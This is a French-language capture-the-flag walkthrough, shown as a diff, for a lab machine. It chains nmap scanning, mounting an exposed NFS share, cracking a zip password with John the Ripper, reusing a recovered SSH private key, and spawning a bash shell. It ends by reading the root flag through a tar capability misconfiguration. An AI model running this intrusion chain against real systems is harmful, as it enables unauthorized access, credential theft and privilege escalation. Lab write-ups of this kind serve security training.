@@ -1,0 +1,144 @@
+
+Regarder les ports ouverts entre le 0 et le 200 (car un nmap classic donne trop de ports ouvert)
+
+```bash
+nmap -p 0-200 -v <ip>
+```
+
+très longue réponse
+mais la seul partis intérésante c'est ça:
+    111/tcp open   rpcbind
+
+avec rpcbind accéder a des serveur de manière distanre
+avec la commande showmount, on peut regarder la liste des répertoire accessible sur un server distant
+
+```bash
+/usr/sbin/showmount -e <ip>
+```
+=>
+
+/home/nfs *
+
+show mount nous dit que un répertoire nfs est accessible,
+nous pouvons donc essayer de le copier et le mettre dans un dossier en local
+
+```bash
+mkdir nfs_distant
+sudo mount -t nfs <ip>:home/nfs nfs_distant -nolock
+```
+
+puis en explorant le contenu téléchargé, nous trouvons un "chest.zip"
+
+```bash
+cd nfs_distant
+ls
+```
+mais si on veut le unzip:
+
+```bash
+unzip chest.zip
+```
+
+Un mot de passe nous sera demandé
+
+Nous devons redirigé les informations de notre "chest.zip" dans un fichier "mdp.txt"
+puis essayer des mods de passe avec John the Ripper
+
+```bash
+zip2john chest.zip > mdp.txt
+john --wordlist=/root/Tools/wordlists/rockyou.txt mdp.txt
+```
+=>
+isaaciscrazy
+
+Cela nous dit que le mots de passse du "chest.zip" est "isaaciscrazy"
+Nous pouvons maintenant unzip notre fichier "chest.zip" avec notre mots de passe
+
+```bash
+unzip chest.zip
+```
+
+en nous promenants dans le conetanu de chest, dans les dossier home/isaac/.ssh/, nous pouvons trover le flag.txt
+
+```bash
+cd home/isaac/.ssh/
+cat flag.txt
+```
+
+dans le meme dossier nous avons le fichier "hint.txt" qui nous dits:
+
+```bash
+cat hint.txt
+```
+=>
+5000-6500
+
+nouos pouvons essayer de faire un nmap sur ces ports là
+
+```bash
+nmap -p 5000-6000 -v <ip>
+```
+très longue réponse
+mais la seul partis intérésante c'est ça:
+    5555/tcp open  freeciv
+
+nous pouvons voir que sur le port tcp 5555 il y a un server freeciv
+Dans le dossier .ssh nous pouvons voir le fichier id_rsa
+
+NOus pouvons donc faire une conexion ssh sur le port 5555 avec comme identifiant isaac et l'id_rsa
+
+```bash
+ssh isaac@<ip> -p 5555 -i id_rsa
+```
+
+nous pouvons rentré dedans la commande qui va nous faire apparaitre un shell
+
+```bash
+system('/bin/bash)
+```bash
+
+dans ce shell, nous pouvons avoir le user.txt
+
+```bash
+cat user.txt
+```
+
+Pour la suite nous devons installer et lancé linpeas pour trouvé out de potential escalade de privilège
+linpeas nous dit que il y en a un possible avec "/bin/tar"
+
+Avec la commande getcap, nous apprenons que "/bin/tar" peut lire les fichier
+```bash
+getcap /bin/tar
+```
+
+-> /bin/tar cap_dac_read_search=ep
+
+
+en revenant dans isaac (donc avec un directory en arrière),
+
+nous pouvons faire
+
+```bash
+ls -la
+```
+
+et ainsi voir que on a le droit de write dans .ssh, nous allns donc nous y rendre
+
+```bash
+cd .ssh
+```
+
+en nous aidans de ce site internet:
+https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
+
+nous pouvons creer une archive de /root/root.txt dans notre fichier root_flag.txt
+
+```bash
+/bin/tar -cvf root_flag.txt /root/root.txt
+```
+
+par la suite nous pouvons avoir accès au dernier flag de cette room
+
+```bash
+cat root_flag.txt
+```
